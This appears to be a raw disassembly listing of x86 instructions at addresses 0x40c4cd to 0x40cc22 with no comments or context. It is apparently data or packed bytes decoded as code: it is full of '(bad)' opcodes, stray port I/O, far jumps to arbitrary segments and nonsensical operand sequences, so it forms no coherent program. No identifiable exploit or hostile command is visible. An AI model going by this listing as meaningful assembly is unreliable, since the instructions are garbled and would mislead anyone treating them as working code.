  40c4cd:	leave  
  40c4ce:	xchg   esp,eax
  40c4cf:	mov    ebx,0xc43504e3
  40c4d4:	ins    BYTE PTR es:[edi],dx
  40c4d5:	fchs   
  40c4d7:	xor    BYTE PTR [eax],ch
  40c4d9:	rcr    BYTE PTR [ecx],cl
  40c4db:	fstp   TBYTE PTR [ebx+0x72]
  40c4de:	pop    ds
  40c4df:	push   ss
  40c4e0:	mov    eax,DWORD PTR [edx-0x25]
  40c4e3:	sar    BYTE PTR [ecx+0x5f],0xe3
  40c4e7:	and    eax,DWORD PTR [edi+edx*8+0x76]
  40c4eb:	rcl    DWORD PTR [eax+edx*4+0x4b48f60e],0x8e
  40c4f3:	fmul   QWORD PTR [edx-0x67e68a4f]
  40c4f9:	xchg   edx,eax
  40c4fa:	ss clc 
  40c4fc:	loop   0x40c498
  40c4fe:	mov    dh,BYTE PTR [edx]
  40c500:	mov    ds:0x7f6f70cc,eax
  40c505:	sbb    ah,ch
  40c507:	mov    bh,BYTE PTR [edi+eiz*4+0xc]
  40c50b:	lods   al,BYTE PTR ds:[esi]
  40c50c:	pop    ebp
  40c50d:	aaa    
  40c50e:	inc    ebx
  40c50f:	xchg   edi,eax
  40c510:	inc    ebx
  40c511:	push   edx
  40c512:	mov    WORD PTR [edx],es
  40c514:	fmul   QWORD PTR [ecx+0x6c]
  40c517:	adc    ecx,DWORD PTR [eax-0x21]
  40c51a:	xchg   ecx,eax
  40c51b:	bts    DWORD PTR [ebp+ecx*8+0x3],ecx
  40c520:	jg     0x40c525
  40c522:	in     al,0x6c
  40c524:	xchg   ebx,eax
  40c525:	fst    DWORD PTR [edi-0x1c7b2c0f]
  40c52b:	xor    DWORD PTR [eax-0x71],edi
  40c52e:	ss popf 
  40c530:	xor    ecx,ebx
  40c532:	test   eax,0xbd44edfc
  40c537:	xchg   ebp,eax
  40c538:	push   esp
  40c539:	mov    bh,0xb9
  40c53b:	aad    0x4
  40c53d:	rol    DWORD PTR [edi+0x43],0x61
  40c541:	ds cmc 
  40c543:	shl    BYTE PTR [ebp+0x27229399],0xc
  40c54a:	cmp    esp,DWORD PTR es:[esi-0x21]
  40c54e:	sbb    eax,0x27750000
  40c553:	jo     0x40c515
  40c555:	fmul   DWORD PTR [edi-0x7b85275e]
  40c55b:	sbb    eax,0x67de4227
  40c560:	or     dl,ah
  40c562:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c563:	and    eax,0x605959a5
  40c568:	mov    esp,0xbc6a4fcf
  40c56d:	adc    eax,0x282d1b40
  40c572:	xchg   edi,eax
  40c573:	retf   
  40c574:	push   ds
  40c575:	jle    0x40c50a
  40c577:	jo     0x40c504
  40c579:	xchg   esi,eax
  40c57a:	jo     0x40c5e6
  40c57c:	cmp    esp,DWORD PTR [esi]
  40c57e:	or     al,0xdc
  40c580:	mov    edi,0x11c24328
  40c585:	pusha  
  40c586:	jb     0x40c5b7
  40c588:	stc    
  40c589:	xchg   ecx,eax
  40c58a:	inc    esp
  40c58b:	ja     0x40c5b2
  40c58d:	(bad)  
  40c58e:	fcom   st(5)
  40c590:	es push 0x14
  40c593:	jge    0x40c51d
  40c595:	pop    eax
  40c596:	jno    0x40c612
  40c598:	xchg   esi,eax
  40c599:	xor    al,0x2d
  40c59b:	push   ebx
  40c59c:	neg    dl
  40c59e:	inc    ebp
  40c59f:	scas   al,BYTE PTR es:[edi]
  40c5a0:	call   0x3b28169
  40c5a5:	enter  0x289e,0xa1
  40c5a9:	cmp    al,0xc1
  40c5ab:	pmaxub mm2,QWORD PTR [edx+0x72e59400]
  40c5b2:	fimul  DWORD PTR [edi-0x4129e404]
  40c5b8:	add    eax,0x72caf5db
  40c5bd:	dec    eax
  40c5be:	add    ah,ah
  40c5c0:	cdq    
  40c5c1:	pop    ecx
  40c5c2:	and    al,0x5f
  40c5c4:	je     0x40c5b5
  40c5c6:	or     ch,BYTE PTR [edx+0x67b202cf]
  40c5cc:	sbb    eax,DWORD PTR [esi-0x5330fcfc]
  40c5d2:	or     DWORD PTR [eax-0x3790ebcb],edi
  40c5d8:	mov    al,ds:0xda552485
  40c5dd:	fst    DWORD PTR ds:0x74a7b6da
  40c5e3:	fidivr WORD PTR [eax-0x492fa798]
  40c5e9:	push   esp
  40c5ea:	fwait
  40c5eb:	inc    ecx
  40c5ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c5ed:	repz jns 0x40c5ee
  40c5f0:	add    BYTE PTR [ebp+0x4a82fa44],bl
  40c5f6:	dec    eax
  40c5f7:	pop    eax
  40c5f8:	dec    esp
  40c5f9:	stc    
  40c5fa:	xor    al,0x12
  40c5fc:	mov    esp,0xfde0fc5
  40c601:	xchg   ebp,eax
  40c602:	std    
  40c603:	loop   0x40c66b
  40c605:	mov    dl,0xcd
  40c607:	sahf   
  40c608:	xor    eax,0xfc05d808
  40c60d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c60e:	stc    
  40c60f:	icebp  
  40c610:	xor    BYTE PTR [ebx+ebx*4+0x5],al
  40c614:	fistp  QWORD PTR [ecx-0x78]
  40c617:	arpl   WORD PTR [edx+0x1dc5acab],dx
  40c61d:	sahf   
  40c61e:	aam    0xc5
  40c620:	sbb    ebx,DWORD PTR [ebx+0x1ec3a8d8]
  40c626:	mov    DWORD PTR [ebx],ebx
  40c628:	cmp    al,BYTE PTR [edi]
  40c62a:	cwde   
  40c62b:	xchg   BYTE PTR [ebp-0x7b],al
  40c62e:	popf   
  40c62f:	outs   dx,BYTE PTR ds:[esi]
  40c630:	cmp    al,0xda
  40c632:	mov    ah,0xeb
  40c634:	push   ds
  40c635:	xor    al,0x2b
  40c637:	mov    DWORD PTR [esp+edi*4-0x77929599],ecx
  40c63e:	inc    ebx
  40c63f:	push   ebx
  40c640:	rcr    DWORD PTR [edx],cl
  40c642:	es mov ah,0x26
  40c645:	push   0x6b79ba0a
  40c64a:	test   eax,0xd291346
  40c64f:	ins    BYTE PTR es:[edi],dx
  40c650:	pop    edx
  40c651:	and    DWORD PTR [eax-0x14],edi
  40c654:	add    BYTE PTR [ecx-0x10],bh
  40c657:	cmc    
  40c658:	and    eax,0x6546d40a
  40c65d:	adc    BYTE PTR [ecx+0x4e],cl
  40c660:	xchg   bh,dh
  40c662:	ins    BYTE PTR es:[edi],dx
  40c663:	push   ss
  40c664:	and    al,0x74
  40c666:	mov    al,ds:0xc041c6c3
  40c66b:	push   ebx
  40c66c:	int    0xaf
  40c66e:	fcmovnb st,st(6)
  40c670:	aas    
  40c671:	xchg   BYTE PTR [edi-0x72069100],ch
  40c677:	mov    al,0x20
  40c679:	out    0xc3,eax
  40c67b:	retf   0xd975
  40c67e:	pop    ecx
  40c67f:	test   al,0x90
  40c681:	jne    0x40c66b
  40c683:	out    0xee,al
  40c685:	mov    cl,ch
  40c687:	pop    es
  40c688:	into   
  40c689:	inc    edi
  40c68a:	pop    edx
  40c68b:	call   0xf8f4:0x5b18d5ff
  40c692:	inc    ecx
  40c693:	inc    ebp
  40c694:	xor    eax,0x42179720
  40c699:	(bad)  
  40c69a:	icebp  
  40c69b:	xor    BYTE PTR [edi-0x6d],bh
  40c69e:	enter  0x596f,0xfb
  40c6a2:	or     eax,0xb7a20947
  40c6a7:	das    
  40c6a8:	fdiv   QWORD PTR [ebx]
  40c6aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c6ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c6ac:	sub    eax,0xb85ace51
  40c6b1:	xchg   edi,eax
  40c6b2:	sahf   
  40c6b3:	vpshuflw xmm1,XMMWORD PTR [ebx-0x2e],0xe
  40c6b9:	bound  ebp,QWORD PTR [edx+0x34d760f5]
  40c6bf:	add    eax,0x2396f968
  40c6c4:	push   0x1b
  40c6c6:	fstp   QWORD PTR [edx]
  40c6c8:	pop    eax
  40c6c9:	or     eax,0xbd9b8320
  40c6ce:	jnp    0x40c6cc
  40c6d0:	jl     0x40c65f
  40c6d2:	popf   
  40c6d3:	mov    esp,0x31bea4ad
  40c6d8:	mov    dh,BYTE PTR [ebp+edi*8+0x3e]
  40c6dc:	out    0x21,eax
  40c6de:	shl    BYTE PTR [ecx-0x2429db58],1
  40c6e4:	stc    
  40c6e5:	mov    ds:0xbf83da26,eax
  40c6ea:	push   edx
  40c6eb:	jns    0x40c6bb
  40c6ed:	out    0x6,eax
  40c6ef:	ficom  DWORD PTR [ebx]
  40c6f1:	cld    
  40c6f2:	test   BYTE PTR [esi+0x4b],cl
  40c6f5:	dec    edi
  40c6f6:	dec    ebp
  40c6f7:	jns    0x40c757
  40c6f9:	inc    esp
  40c6fa:	(bad)  
  40c6fb:	dec    ecx
  40c6fc:	mov    esi,0xa97d34cd
  40c701:	dec    ecx
  40c702:	(bad)  
  40c703:	out    dx,eax
  40c704:	inc    ecx
  40c705:	jo     0x40c742
  40c707:	lods   eax,DWORD PTR ds:[esi]
  40c708:	pop    ss
  40c709:	(bad)  
  40c70a:	fistp  QWORD PTR [edi+0x4c]
  40c70d:	pop    ss
  40c70e:	mov    WORD PTR [ecx-0x73b61045],cs
  40c714:	stos   DWORD PTR es:[edi],eax
  40c715:	aad    0x2f
  40c717:	xlat   BYTE PTR ds:[ebx]
  40c718:	jae    0x40c795
  40c71a:	jne    0x40c6a0
  40c71c:	jle    0x40c79d
  40c71e:	ror    eax,1
  40c720:	jbe    0x40c6ad
  40c722:	outs   dx,DWORD PTR ds:[esi]
  40c723:	push   eax
  40c724:	mov    ah,0x9d
  40c726:	addr16 pushw ss
  40c729:	add    ebx,edi
  40c72b:	or     DWORD PTR [eax],eax
  40c72d:	inc    eax
  40c72e:	or     dl,BYTE PTR [ebx-0x24]
  40c731:	sbb    esp,DWORD PTR [edi]
  40c733:	scas   eax,DWORD PTR es:[edi]
  40c734:	cmp    eax,0x61b67ae1
  40c739:	mov    al,ds:0x4e75e468
  40c73e:	cmp    eax,0x8c5bfddd
  40c743:	or     cl,dl
  40c745:	sar    BYTE PTR [edi+0x639cd384],cl
  40c74b:	std    
  40c74c:	mov    bh,0x88
  40c74e:	jne    0x40c7cc
  40c750:	push   eax
  40c751:	scas   al,BYTE PTR es:[edi]
  40c752:	cmp    bl,BYTE PTR [edi-0x6c3ba8e5]
  40c758:	push   eax
  40c759:	inc    ecx
  40c75a:	inc    esi
  40c75b:	jg     0x40c773
  40c75d:	bound  ecx,QWORD PTR [ebp+0x57c432fe]
  40c763:	pop    esi
  40c764:	mov    ds:0x5bf56e39,al
  40c769:	sar    ebp,0x9f
  40c76c:	jle    0x40c770
  40c76e:	stc    
  40c76f:	jp     0x40c74f
  40c771:	mov    dl,0x60
  40c773:	inc    edx
  40c774:	push   0x1a
  40c776:	mov    cl,BYTE PTR [edx]
  40c778:	mov    esp,DWORD PTR [eax+0x2056dbbe]
  40c77e:	inc    BYTE PTR [ebx]
  40c780:	adc    edi,ecx
  40c782:	add    BYTE PTR [eax],0x1e
  40c785:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c786:	sbb    cl,BYTE PTR [edx+0x2a26b9d2]
  40c78c:	es mov esp,0x7f64d11
  40c792:	bound  edi,QWORD PTR [edi+edx*2]
  40c795:	dec    esi
  40c796:	push   ds
  40c797:	lods   al,BYTE PTR ds:[esi]
  40c798:	or     bh,0x24
  40c79b:	jae    0x40c7eb
  40c79d:	jns    0x40c7d7
  40c79f:	sbb    eax,0x29166f53
  40c7a4:	push   es
  40c7a5:	xchg   edi,eax
  40c7a6:	imul   edi,DWORD PTR [esi-0x63a7bac9],0x12dcbaa4
  40c7b0:	es inc ecx
  40c7b2:	stc    
  40c7b3:	sbb    al,0x80
  40c7b5:	jo     0x40c7e9
  40c7b7:	psadbw mm7,QWORD PTR [ebp+eiz*1-0x5e8c8102]
  40c7bf:	sbb    ebp,edx
  40c7c1:	div    BYTE PTR [edi-0x625ddf9b]
  40c7c7:	retf   0xb84e
  40c7ca:	sbb    ecx,0x15
  40c7cd:	int    0xb0
  40c7cf:	lods   eax,DWORD PTR ds:[esi]
  40c7d0:	pop    ss
  40c7d1:	psubb  mm5,QWORD PTR [edx-0x7a]
  40c7d5:	lock mov esp,0x65802f73
  40c7db:	data16 aaa 
  40c7dd:	pushf  
  40c7de:	sub    al,0x98
  40c7e0:	xchg   ebp,eax
  40c7e1:	cmc    
  40c7e2:	sub    dh,BYTE PTR [eax-0x6d]
  40c7e5:	xchg   ebx,eax
  40c7e6:	clc    
  40c7e7:	ins    DWORD PTR es:[edi],dx
  40c7e8:	xchg   BYTE PTR ds:0x5a8078d,cl
  40c7ee:	xchg   esi,eax
  40c7ef:	mov    dh,0x91
  40c7f1:	mov    bl,0x50
  40c7f3:	sahf   
  40c7f4:	push   0x71
  40c7f6:	sub    esp,DWORD PTR [edi+0x50]
  40c7f9:	mov    eax,0x6a027519
  40c7fe:	fwait
  40c7ff:	mov    eax,ds:0x89d2022a
  40c804:	jae    0x40c7cd
  40c806:	cmp    edi,edx
  40c808:	loopne 0x40c7b7
  40c80a:	sbb    bl,BYTE PTR [ebp-0x68]
  40c80d:	xor    ch,BYTE PTR [ecx+0x72]
  40c810:	stos   BYTE PTR es:[edi],al
  40c811:	fwait
  40c812:	arpl   WORD PTR [edi-0x3acee642],bx
  40c818:	ins    DWORD PTR es:[di],dx
  40c81a:	lock jp 0x40c840
  40c81d:	xchg   ebx,eax
  40c81e:	bound  edx,QWORD PTR [ebx]
  40c820:	cmp    BYTE PTR [ebp+ebp*2+0x3990de6f],cl
  40c827:	ret    0xa5e5
  40c82a:	dec    ebp
  40c82b:	mov    esi,0x5c389f34
  40c830:	cmp    BYTE PTR [esi+edx*8+0x6ea1d1a7],al
  40c837:	shl    BYTE PTR gs:[edi+eax*1],1
  40c83b:	xor    eax,0x4c393c71
  40c840:	imul   ebp,DWORD PTR [eax],0x312c0cf
  40c846:	cwde   
  40c847:	cld    
  40c848:	mov    ebp,0xd70195ab
  40c84d:	rcl    DWORD PTR [ebx-0x58f54125],0xed
  40c854:	mov    DWORD PTR [esi+0x4d],0xe053352f
  40c85b:	adc    al,0x84
  40c85d:	or     eax,0x7a42cb6a
  40c862:	cld    
  40c863:	lock stc 
  40c865:	mov    bl,0x10
  40c868:	cdq    
  40c869:	pop    edx
  40c86a:	add    esp,DWORD PTR [edx-0x57]
  40c86d:	loope  0x40c8df
  40c86f:	xchg   ebp,eax
  40c870:	inc    eax
  40c871:	and    DWORD PTR [ecx-0x33],edx
  40c874:	arpl   WORD PTR [ecx-0x3a],di
  40c877:	scas   eax,DWORD PTR es:[edi]
  40c878:	pop    ds
  40c879:	ds jno 0x40c860
  40c87c:	xchg   ebx,eax
  40c87d:	add    eax,0x6f1a1e78
  40c882:	rcl    eax,1
  40c884:	xchg   ebp,eax
  40c885:	mov    dl,0x41
  40c887:	pop    ss
  40c888:	fisub  DWORD PTR [edx]
  40c88a:	gs jp  0x40c861
  40c88d:	(bad)  
  40c88e:	fisub  WORD PTR [edi]
  40c890:	ror    DWORD PTR [edi-0x1],cl
  40c893:	push   cs
  40c894:	xor    BYTE PTR [esi-0x78],ch
  40c897:	or     BYTE PTR [edx-0x5f083194],dl
  40c89d:	std    
  40c89e:	(bad)  
  40c89f:	mov    edx,0xbfbabe0d
  40c8a4:	dec    esi
  40c8a5:	jge    0x40c856
  40c8a7:	add    cl,cl
  40c8a9:	jne    0x40c864
  40c8ab:	mov    gs,WORD PTR [di]
  40c8ae:	out    0x84,al
  40c8b0:	xlat   BYTE PTR ds:[ebx]
  40c8b1:	div    DWORD PTR [ebp-0x3c]
  40c8b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c8b5:	lock xor DWORD PTR [edi+0x6398f4f5],0xffffff9e
  40c8bd:	cmp    DWORD PTR [ebx-0x72],esp
  40c8c0:	pushf  
  40c8c1:	sbb    edi,DWORD PTR [ebx+0x204413be]
  40c8c7:	pop    edx
  40c8c8:	out    0x8e,eax
  40c8ca:	cmp    ecx,ecx
  40c8cc:	sbb    dl,cl
  40c8ce:	xchg   ebp,eax
  40c8cf:	fmul   QWORD PTR [esi-0x47]
  40c8d2:	cmp    al,0x24
  40c8d4:	retf   
  40c8d5:	hlt    
  40c8d6:	and    edx,DWORD PTR [edi-0x10]
  40c8d9:	sbb    eax,esp
  40c8db:	jp     0x40c8d5
  40c8dd:	push   es
  40c8de:	std    
  40c8df:	mov    ds:0x1fce4b0c,eax
  40c8e4:	daa    
  40c8e5:	cmp    al,0x57
  40c8e7:	(bad)  
  40c8e8:	dec    ebx
  40c8e9:	mov    ds:0x8e84ec69,eax
  40c8ee:	in     al,0xc1
  40c8f0:	sub    eax,0xcd736f72
  40c8f5:	std    
  40c8f6:	sub    eax,0xe708fb78
  40c8fb:	addr16 and al,0x36
  40c8fe:	rcr    DWORD PTR [ebx-0x15],cl
  40c901:	xor    DWORD PTR [esi],ebx
  40c903:	jne    0x40c89d
  40c905:	or     ebp,ebx
  40c907:	cli    
  40c908:	xchg   BYTE PTR [esi+ecx*2],bh
  40c90b:	adc    BYTE PTR ds:0x9d91cbc,0xf8
  40c912:	(bad)  [ecx+0x16]
  40c915:	sub    dl,al
  40c917:	mov    al,0xdf
  40c919:	or     BYTE PTR [ecx+edx*2-0x14],al
  40c91d:	inc    esp
  40c91e:	xor    ebx,ecx
  40c920:	pop    edx
  40c921:	lds    edi,FWORD PTR [ecx+0x4d81cddd]
  40c927:	in     eax,dx
  40c928:	mov    esi,0x3f63fde2
  40c92d:	mov    fs,esp
  40c92f:	and    DWORD PTR [ebp-0x68d8e777],ebp
  40c935:	retf   
  40c936:	push   0x6af67140
  40c93b:	js     0x40c90c
  40c93d:	mov    edx,0x488e8704
  40c942:	jnp    0x40c8d7
  40c944:	xor    al,0x7d
  40c946:	fisub  DWORD PTR [esi+0x20]
  40c949:	push   ecx
  40c94a:	hlt    
  40c94b:	ss dec ebp
  40c94d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c94e:	xor    esi,DWORD PTR [ecx-0x46]
  40c951:	pop    esp
  40c952:	adc    DWORD PTR [esi-0x673a91d1],edi
  40c958:	lods   al,BYTE PTR es:[esi]
  40c95a:	sbb    edi,DWORD PTR [esi]
  40c95c:	sub    edx,DWORD PTR [ebx+edi*4]
  40c95f:	mov    eax,0x2ce01b58
  40c964:	repnz xchg edi,eax
  40c966:	outs   dx,BYTE PTR ds:[esi]
  40c967:	and    al,0x5b
  40c969:	or     BYTE PTR [ecx-0xd],bh
  40c96c:	les    esi,FWORD PTR [edi]
  40c96e:	aad    0x5e
  40c970:	sahf   
  40c971:	jbe    0x40c9e2
  40c973:	mov    ch,0x56
  40c975:	ins    BYTE PTR es:[edi],dx
  40c976:	pop    eax
  40c977:	mov    esp,0x93c202e6
  40c97c:	es inc edi
  40c97e:	xchg   ebp,eax
  40c97f:	mov    DWORD PTR [eax+edx*1+0x56d7290a],eax
  40c986:	mov    dl,BYTE PTR ds:0x4ad78300
  40c98c:	push   esp
  40c98d:	cmp    edi,DWORD PTR [eax-0x7d98a3c5]
  40c993:	dec    ebx
  40c994:	sbb    al,BYTE PTR [edx-0x2dd479b0]
  40c99a:	dec    esi
  40c99b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c99c:	jmp    0x40ca13
  40c99e:	shl    BYTE PTR [ebx+0x1a2690e5],1
  40c9a4:	jb     0x40c931
  40c9a6:	xchg   ebx,eax
  40c9a7:	nop
  40c9a8:	and    eax,0xdc6ce737
  40c9ad:	jmp    0x3441:0xceba0154
  40c9b4:	push   esi
  40c9b5:	mov    ds,ebx
  40c9b7:	pop    es
  40c9b8:	jae    0x40c99c
  40c9ba:	dec    ebp
  40c9bb:	xor    eax,0x440640f3
  40c9c0:	test   eax,0xbc6cd9f1
  40c9c5:	adc    eax,0x8526150c
  40c9ca:	rcl    BYTE PTR [ecx+eiz*8+0x34],cl
  40c9ce:	cmp    BYTE PTR [ebx-0x1eca4141],0x14
  40c9d5:	repnz pop es
  40c9d7:	test   al,0x4
  40c9d9:	add    ecx,ebp
  40c9db:	inc    ebp
  40c9dc:	xchg   DWORD PTR [ebx],eax
  40c9de:	outs   dx,BYTE PTR ds:[esi]
  40c9df:	outs   dx,BYTE PTR ds:[esi]
  40c9e0:	(bad)  [esi+0x7d20b27e]
  40c9e6:	repnz dec ecx
  40c9e8:	call   0xafc1f19
  40c9ed:	and    al,0x5c
  40c9ef:	sti    
  40c9f0:	adc    DWORD PTR [ebx],ebx
  40c9f2:	dec    edx
  40c9f3:	pop    eax
  40c9f4:	in     al,dx
  40c9f5:	cmp    DWORD PTR [ebx+0x74],eax
  40c9f8:	jnp    0x40ca10
  40c9fa:	push   ebp
  40c9fb:	push   edi
  40c9fc:	jnp    0x40c9ab
  40c9fe:	es xchg ecx,eax
  40ca00:	push   0xb96b1efd
  40ca05:	(bad)  
  40ca06:	fsub   QWORD PTR [edx]
  40ca08:	int3   
  40ca09:	ds sbb al,0x15
  40ca0c:	outs   dx,DWORD PTR ds:[esi]
  40ca0d:	cdq    
  40ca0e:	push   0x16afc02d
  40ca13:	mov    ah,0xaf
  40ca15:	jmp    0x40ca8f
  40ca17:	addr16 test eax,0x97bee797
  40ca1d:	call   0x99a:0xdd531527
  40ca24:	mov    WORD PTR [eax-0x1d127251],ds
  40ca2a:	(bad)  [ecx-0x7b0f07b3]
  40ca30:	adc    DWORD PTR [edx-0x80],0x8c118d12
  40ca37:	inc    esp
  40ca38:	push   ebp
  40ca39:	icebp  
  40ca3a:	popf   
  40ca3b:	adc    al,0x6d
  40ca3d:	or     ch,BYTE PTR [ebp+0x61472c41]
  40ca43:	cmp    bl,dh
  40ca45:	dec    ecx
  40ca46:	dec    edx
  40ca47:	xchg   esi,eax
  40ca48:	mov    ebx,ebx
  40ca4a:	out    0xbb,eax
  40ca4c:	inc    esi
  40ca4d:	jmp    DWORD PTR [ecx+ebp*8]
  40ca50:	adc    bh,cl
  40ca52:	int    0xdc
  40ca54:	dec    edx
  40ca55:	adc    al,0x43
  40ca57:	fwait
  40ca58:	sbb    eax,0xffffffce
  40ca5b:	add    BYTE PTR [ebp-0x3e67a67b],dh
  40ca61:	sbb    eax,0x83413101
  40ca66:	sub    dh,BYTE PTR [esi+0x23]
  40ca69:	xchg   esp,eax
  40ca6a:	outs   dx,DWORD PTR ds:[esi]
  40ca6b:	xchg   edi,eax
  40ca6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca6d:	cmp    BYTE PTR [edx],al
  40ca6f:	repz cdq 
  40ca71:	inc    ebp
  40ca72:	sub    al,0x4e
  40ca74:	add    eax,0xf2d96c8e
  40ca79:	loop   0x40caad
  40ca7b:	push   ebp
  40ca7c:	stos   BYTE PTR es:[edi],al
  40ca7d:	jecxz  0x40ca56
  40ca7f:	mov    bh,0xbf
  40ca81:	jecxz  0x40caed
  40ca83:	inc    eax
  40ca84:	cmp    al,0x44
  40ca86:	mov    eax,0x900c58c9
  40ca8b:	or     al,0x3
  40ca8d:	repnz lods eax,DWORD PTR ds:[esi]
  40ca8f:	call   0x90113ead
  40ca94:	test   eax,0x4e13b540
  40ca99:	cmp    al,0xe
  40ca9b:	and    DWORD PTR [edi-0x6925bf54],ecx
  40caa1:	dec    ebp
  40caa2:	sar    DWORD PTR [ecx],0xe2
  40caa5:	mov    ?,WORD PTR [ebx+0x7c]
  40caa8:	push   ebx
  40caa9:	dec    ebx
  40caaa:	pop    ecx
  40caab:	aas    
  40caac:	mov    eax,0x13c9cd4e
  40cab1:	sub    bh,BYTE PTR [ebx+0x2a6ac76b]
  40cab7:	jns    0x40ca85
  40cab9:	jne    0x40cb1b
  40cabb:	inc    eax
  40cabc:	jo     0x40ca55
  40cabe:	mov    esp,0xd5bef302
  40cac3:	and    BYTE PTR [ebx],cl
  40cac5:	lahf   
  40cac6:	ret    0x4c21
  40cac9:	push   0xffffffc2
  40cacb:	test   al,0xb7
  40cacd:	out    dx,eax
  40cace:	jecxz  0x40cab9
  40cad0:	sbb    dh,BYTE PTR [ecx+0x39a9fae1]
  40cad6:	ins    BYTE PTR es:[edi],dx
  40cad7:	pop    ecx
  40cad8:	pop    ebx
  40cad9:	push   es
  40cada:	aas    
  40cadb:	cli    
  40cadc:	sub    ebp,ebp
  40cade:	shr    BYTE PTR [esp+0x16],cl
  40cae2:	jl     0x40caef
  40cae4:	scas   al,BYTE PTR es:[edi]
  40cae5:	mov    edi,0xc1fc7845
  40caea:	sar    BYTE PTR [edx],1
  40caec:	xchg   ebx,eax
  40caed:	(bad)  
  40caee:	cmp    al,0x60
  40caf0:	xchg   ecx,eax
  40caf1:	aas    
  40caf2:	ins    BYTE PTR es:[edi],dx
  40caf3:	das    
  40caf4:	outs   dx,BYTE PTR ds:[esi]
  40caf5:	dec    esi
  40caf6:	jae    0x40cb11
  40caf8:	int    0xa1
  40cafa:	clc    
  40cafb:	push   esi
  40cafc:	dec    edx
  40cafd:	sub    al,0x53
  40caff:	int    0x58
  40cb01:	or     al,0xa8
  40cb03:	mov    ah,0xf1
  40cb05:	mov    edi,0xdef1f92c
  40cb0a:	out    0x22,al
  40cb0c:	enter  0x3240,0xbf
  40cb10:	add    dh,BYTE PTR [edx]
  40cb12:	and    DWORD PTR [ebp-0x47],edi
  40cb15:	jecxz  0x40cb7d
  40cb17:	mov    al,ds:0xffbed0bf
  40cb1c:	pop    ecx
  40cb1d:	clc    
  40cb1e:	arpl   WORD PTR [ebp+0x6c],si
  40cb21:	je     0x40cac1
  40cb23:	lahf   
  40cb24:	(bad)  
  40cb25:	sub    BYTE PTR [ebx+0x7e5b0a51],cl
  40cb2b:	inc    ecx
  40cb2c:	lods   al,BYTE PTR ds:[esi]
  40cb2d:	je     0x40cabb
  40cb2f:	push   ecx
  40cb30:	rol    DWORD PTR [esp+ebx*2+0x116524ce],1
  40cb37:	imul   ecx,DWORD PTR [esi],0xffffffa1
  40cb3a:	push   ebx
  40cb3b:	loopne 0x40cb7f
  40cb3d:	jle    0x40cb3a
  40cb3f:	push   ds
  40cb40:	inc    BYTE PTR [esi-0xd77f73a]
  40cb46:	out    0x32,al
  40cb48:	pushf  
  40cb49:	sbb    ebp,DWORD PTR [ebx-0x35]
  40cb4c:	out    dx,al
  40cb4d:	and    DWORD PTR [edx+ecx*8-0x80],edx
  40cb51:	mov    fs,WORD PTR [ecx-0xa6c56d5]
  40cb57:	add    ebp,DWORD PTR [eax-0x64]
  40cb5a:	iret   
  40cb5b:	std    
  40cb5c:	mov    cs,WORD PTR [edx-0x7d7a929]
  40cb62:	imul   esi,ecx,0x70
  40cb65:	push   0xffffffb3
  40cb67:	(bad)  
  40cb68:	push   0x33fedd35
  40cb6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb6e:	and    bl,BYTE PTR [ebx]
  40cb70:	and    DWORD PTR [eax+0x9],ebp
  40cb73:	lea    esp,[edx-0x48ff5b8b]
  40cb79:	mov    dl,0xa9
  40cb7b:	pop    ecx
  40cb7c:	stos   DWORD PTR es:[edi],eax
  40cb7d:	out    dx,al
  40cb7e:	sbb    dh,ch
  40cb80:	inc    eax
  40cb81:	xchg   ebp,ecx
  40cb83:	loop   0x40cbe6
  40cb85:	cmc    
  40cb86:	sub    DWORD PTR [ebx+ebx*8-0x6d],eax
  40cb8a:	test   ch,ch
  40cb8c:	je     0x40cbce
  40cb8e:	cmp    ch,BYTE PTR [ecx-0x57]
  40cb91:	mov    esp,0x4a9146a4
  40cb96:	or     eax,0xd32a9349
  40cb9b:	mov    dh,0xc2
  40cb9d:	lds    ebp,FWORD PTR [ebx]
  40cb9f:	je     0x40cbf8
  40cba1:	dec    esi
  40cba2:	xor    bl,BYTE PTR [edi+0x107e06db]
  40cba8:	mov    edi,0x56de44b2
  40cbad:	ds dec eax
  40cbaf:	adc    esp,DWORD PTR [ebx-0x61]
  40cbb2:	gs dec esp
  40cbb4:	inc    ebp
  40cbb5:	arpl   WORD PTR [edx+edx*4-0x9],di
  40cbb9:	xchg   ecx,eax
  40cbba:	mov    ebp,0x6e704483
  40cbbf:	mov    bl,0x8
  40cbc1:	pop    ss
  40cbc2:	pop    es
  40cbc3:	pop    ebx
  40cbc4:	fidivr DWORD PTR [esi+0xce2e3ae]
  40cbca:	retf   0xa19c
  40cbcd:	sbb    BYTE PTR [edx],bh
  40cbcf:	lods   al,BYTE PTR ds:[esi]
  40cbd0:	add    ebx,esi
  40cbd2:	push   edx
  40cbd3:	aas    
  40cbd4:	and    BYTE PTR [esi-0x7b297736],dl
  40cbda:	sub    BYTE PTR [edx],0x1
  40cbdd:	pop    edi
  40cbde:	outs   dx,BYTE PTR ds:[esi]
  40cbdf:	pop    ecx
  40cbe0:	push   ecx
  40cbe1:	adc    eax,0xfd8a8b3c
  40cbe7:	push   ebp
  40cbe8:	add    dl,BYTE PTR [edx+0x34]
  40cbeb:	and    al,0x22
  40cbed:	jnp    0x40cbf5
  40cbef:	test   bl,dl
  40cbf1:	or     eax,0x4b7280c1
  40cbf6:	stos   DWORD PTR es:[edi],eax
  40cbf7:	push   esi
  40cbf8:	jae    0x40cb7b
  40cbfa:	test   al,0x94
  40cbfc:	or     eax,0x3d7cdade
  40cc01:	jmp    0x40cc05
  40cc03:	mov    ebx,0xa3380377
  40cc08:	sub    BYTE PTR [ebx-0x34],al
  40cc0b:	popa   
  40cc0c:	inc    eax
  40cc0d:	pop    ss
  40cc0e:	push   eax
  40cc0f:	sbb    DWORD PTR [ecx-0x41],ebp
  40cc12:	call   0x6ac9375
  40cc17:	(bad)  
  40cc19:	fnstenv [eax+0x2a1eab76]
  40cc1f:	into   
  40cc20:	je     0x40cbfd
  40cc22:	nop
